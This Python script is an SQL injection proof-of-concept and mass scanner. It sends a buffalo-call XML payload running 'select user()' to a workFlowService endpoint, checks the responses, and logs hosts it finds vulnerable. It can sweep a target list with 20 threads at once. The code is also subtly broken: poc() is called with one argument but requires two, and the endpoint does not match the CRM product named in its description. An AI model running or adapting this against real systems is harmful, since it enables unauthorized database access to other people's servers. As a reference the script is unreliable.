import argparse, requests, sys, json, re, os
from multiprocessing.dummy import Pool
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def banner():
    test = """
   ___ _                __                 _              __    ____  __  
  / __\ | _____      __/ _\ ___ _ ____   _(_) ___ ___    / _\  /___ \/ /  
 / _\ | |/ _ \ \ /\ / /\ \ / _ \ '__\ \ / / |/ __/ _ \   \ \  //  / / /   
/ /   | | (_) \ V  V / _\ \  __/ |   \ V /| | (_|  __/   _\ \/ \_/ / /___ 
\/    |_|\___/ \_/\_/  \__/\___|_|    \_/ |_|\___\___|___\__/\___,_\____/ 
                                                    |_____|               """
    print(test)

def main():
    banner()
    parser =argparse.ArgumentParser(description="任我行 CRM SmsDataList SQL注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")

def poc(target, output_file):
    payload = "/OAapp/bfapp/buffalo/workFlowService"
    headers = {
        "Accept-Encoding": "identity",
        "Content-Length": "103",
        "Accept-Language": "zh-CN,zh;q=0.8",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
    }
    data = """
<buffalo-call> 
<method>getDataListForTree</method> 
<string>select user()</string> 
</buffalo-call>"""

    try:
        res = requests.post(url=target + payload, headers=headers, data=data, timeout=6, verify=False)
        if "java.util.ArrayList" in res.text:
            print("[+] {0} 存在漏洞！！".format(target))
            if output_file:
                with open(output_file, "at") as f:
                    f.write(target + "\n")  
        else:
            print("[-] {0}".format(target))
    except Exception:
        print(f"连接异常：{target}")
        return

if __name__ == "__main__":
    banner()
    main()